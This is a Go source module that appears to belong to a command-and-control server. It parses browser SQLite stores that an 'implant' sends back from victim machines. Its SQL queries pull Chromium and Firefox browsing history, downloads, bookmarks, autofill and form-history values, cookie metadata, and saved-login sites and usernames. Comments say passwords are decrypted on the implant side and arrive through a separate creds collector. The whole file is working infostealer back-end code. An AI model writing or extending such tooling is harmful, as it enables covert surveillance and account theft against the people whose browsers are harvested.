// Package browser: parse browser SQLite stores that the implant streams back.
//
// Two families of queries live here:
//
//	inventory kinds  — history, bookmarks, cookies, downloads, autofill,
//	                   formhistory: metadata only, secrets are never selected.
//	account kinds    — logins: origin/username/usage stats. The password column
//	                   is still never selected here: password decryption needs
//	                   the target's DPAPI/Keychain/secret-service context, so it
//	                   happens in the implant (see cmd/implant/creds_*.go) and
//	                   arrives through the creds collector instead.
package browser

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
)

var (
	ErrKind = errors.New("unknown query kind")
	// ErrFamily reports a kind that exists for another browser family, e.g.
	// "logins" against a Firefox places.sqlite (Firefox keeps logins.json).
	ErrFamily = errors.New("query kind not available for this browser family")
)

// QuerySpec keeps the SQL and the column order for each supported store.
type QuerySpec struct {
	Columns []string
	SQL     string
}

var chromiumQueries = map[string]QuerySpec{
	"history": {
		Columns: []string{"url", "title", "visits", "last_visit"},
		SQL: `select url, coalesce(title,'') as title, visit_count as visits,
       datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime') as last_visit
  from urls where url not like 'chrome-extension://%'
 order by last_visit_time desc limit 800`,
	},
	"downloads": {
		Columns: []string{"path", "referrer", "bytes", "started"},
		SQL: `select coalesce(target_path,'') as path, coalesce(tab_url,'') as referrer,
       coalesce(total_bytes,0) as bytes,
       datetime(start_time/1000000-11644473600,'unixepoch','localtime') as started
  from downloads order by start_time desc limit 500`,
	},
	"autofill": {
		Columns: []string{"field", "uses", "last_used"},
		SQL: `select name as field, count(*) as uses,
       datetime(max(date_last_used)/1000000-11644473600,'unixepoch','localtime') as last_used
  from autofill group by name order by uses desc limit 500`,
	},
	"logins": {
		Columns: []string{"url", "user", "times_used", "created"},
		SQL: `select coalesce(origin_url,'') as url, coalesce(username_value,'') as user,
       coalesce(times_used,0) as times_used,
       datetime(date_created/1000000-11644473600,'unixepoch','localtime') as created
  from logins order by times_used desc limit 500`,
	},
	"cookies": {
		// metadata only: host, name and expiry. No value/encrypted_value.
		Columns: []string{"host", "name", "expires"},
		SQL: `select host_key as host, name,
       case when expires_utc = 0 then 'session'
            else datetime(expires_utc/1000000-11644473600,'unixepoch','localtime') end as expires
  from cookies order by expires_utc desc limit 800`,
	},
	"formhistory": {
		// Chromium keeps form history in Web Data too, but older builds only
		// expose the autofill table; alias it so the UI has one button.
		Columns: []string{"field", "value", "uses"},
		SQL: `select name as field, coalesce(value,'') as value, count(*) as uses
  from autofill group by name, value order by uses desc limit 500`,
	},
}

var firefoxQueries = map[string]QuerySpec{
	"history": {
		Columns: []string{"url", "title", "visits", "last_visit"},
		SQL: `select url, coalesce(title,'') as title, visit_count as visits,
       datetime(last_visit_date/1000000,'unixepoch','localtime') as last_visit
  from moz_places where hidden = 0 and last_visit_date is not null
 order by last_visit_date desc limit 800`,
	},
	"bookmarks": {
		Columns: []string{"folder", "name", "url"},
		SQL: `select coalesce(f.title,'') as folder, coalesce(b.title,'') as name, p.url
  from moz_bookmarks b
  join moz_places p on p.id = b.fk
  left join moz_bookmarks f on f.id = b.parent
 where b.type = 1 and p.url is not null
 order by b.parent, b.position limit 2000`,
	},
	"formhistory": {
		Columns: []string{"field", "value", "uses"},
		SQL: `select coalesce(fieldname,'') as field, coalesce(value,'') as value,
       coalesce(times_used,0) as uses
  from moz_formhistory order by times_used desc limit 500`,
	},
	"cookies": {
		Columns: []string{"host", "name", "expires"},
		SQL: `select host, name,
       case when expiry = 0 then 'session'
            else datetime(expiry,'unixepoch','localtime') end as expires
  from moz_cookies order by expiry desc limit 800`,
	},
}

// Spec returns the Chromium-family spec for a kind. Kept for callers that only
// need column metadata; Run() sniffs the actual family.
func Spec(kind string) (QuerySpec, bool) {
	q, ok := chromiumQueries[strings.ToLower(kind)]
	return q, ok
}

// Known reports whether the kind is valid for at least one browser family.
func Known(kind string) bool {
	kind = strings.ToLower(kind)
	if _, ok := chromiumQueries[kind]; ok {
		return true
	}
	_, ok := firefoxQueries[kind]
	return ok
}

// Kinds lists every supported query kind, sorted for stable output in docs/UI.
func Kinds() []string {
	seen := map[string]bool{}
	var out []string
	for k := range chromiumQueries {
		if !seen[k] {
			seen[k] = true
			out = append(out, k)
		}
	}
	for k := range firefoxQueries {
		if !seen[k] {
			seen[k] = true
			out = append(out, k)
		}
	}
	sort.Strings(out)
	return out
}

// Run writes the database bytes to a temp file and runs the sqlite3 CLI against
// it. Returns columns and rows in the declared order.
func Run(data []byte, kind string) ([]string, [][]string, error) {
	kind = strings.ToLower(kind)
	if !Known(kind) {
		return nil, nil, ErrKind
	}
	bin, err := exec.LookPath("sqlite3")
	if err != nil {
		return nil, nil, fmt.Errorf("sqlite3 not found on the platform host: %w", err)
	}
	dir, err := os.MkdirTemp("", "c2-browser-")
	if err != nil {
		return nil, nil, err
	}
	defer os.RemoveAll(dir)
	path := filepath.Join(dir, kind+".sqlite")
	if err := os.WriteFile(path, data, 0o600); err != nil {
		return nil, nil, err
	}
	spec, err := pickSpec(bin, path, kind)
	if err != nil {
		return nil, nil, err
	}
	out, err := exec.Command(bin, "-readonly", "-json", path, spec.SQL).CombinedOutput()
	if err != nil {
		msg := strings.TrimSpace(string(out))
		if msg == "" {
			msg = err.Error()
		}
		if len(msg) > 300 {
			msg = msg[:300]
		}
		return nil, nil, fmt.Errorf("sqlite3: %s", msg)
	}
	trimmed := strings.TrimSpace(string(out))
	if trimmed == "" {
		return spec.Columns, [][]string{}, nil
	}
	var records []map[string]any
	if err := json.Unmarshal([]byte(trimmed), &records); err != nil {
		return nil, nil, fmt.Errorf("sqlite3 output: %w", err)
	}
	rows := make([][]string, 0, len(records))
	for _, rec := range records {
		row := make([]string, len(spec.Columns))
		for i, col := range spec.Columns {
			row[i] = cell(rec[col])
		}
		rows = append(rows, row)
	}
	return spec.Columns, rows, nil
}

// pickSpec sniffs the schema so the same "history" kind works for Firefox
// (moz_places) and Chromium (urls) stores, and rejects kinds the detected
// family does not have instead of running SQL that cannot match.
func pickSpec(bin, path, kind string) (QuerySpec, error) {
	probe, err := exec.Command(bin, "-readonly", path,
		"select name from sqlite_master where name in ('moz_places','urls')").Output()
	if err == nil && strings.Contains(string(probe), "moz_places") {
		if q, ok := firefoxQueries[kind]; ok {
			return q, nil
		}
		return QuerySpec{}, fmt.Errorf("%w: %s (firefox)", ErrFamily, kind)
	}
	if q, ok := chromiumQueries[kind]; ok {
		return q, nil
	}
	return QuerySpec{}, fmt.Errorf("%w: %s (chromium)", ErrFamily, kind)
}

func cell(v any) string {
	switch t := v.(type) {
	case nil:
		return ""
	case string:
		return t
	case float64:
		return strings.TrimSuffix(fmt.Sprintf("%.2f", t), ".00")
	default:
		return fmt.Sprint(t)
	}
}
